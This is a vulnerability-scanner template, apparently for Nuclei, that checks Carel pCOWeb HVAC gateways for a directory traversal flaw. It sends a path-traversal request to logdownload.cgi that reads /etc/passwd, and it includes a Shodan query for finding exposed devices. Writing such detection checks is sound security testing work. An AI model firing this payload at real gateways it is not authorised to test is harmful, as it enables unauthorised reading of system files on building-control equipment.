id: pcoweb-dir

info:
  name: Carel pCOWeb HVAC BACnet Gateway 2.1.0 - Directory Traversal
  author: arafatansari
  severity: medium
  reference:
    - https://www.exploit-db.com/exploits/50986
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5709.php
  description: |
    Carel pCOWeb is affected by Directory Traversal on usr-cgi/logdownload.cgi via file parameter.
  metadata:
    shodan-query: http.html:"pCOWeb"
    verified: "true"
  tags: exploitdb,lfi,pcoweb

requests:
  - method: GET
    path:
      - "{{BaseURL}}/usr-cgi/logdownload.cgi?file=../../../../../../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
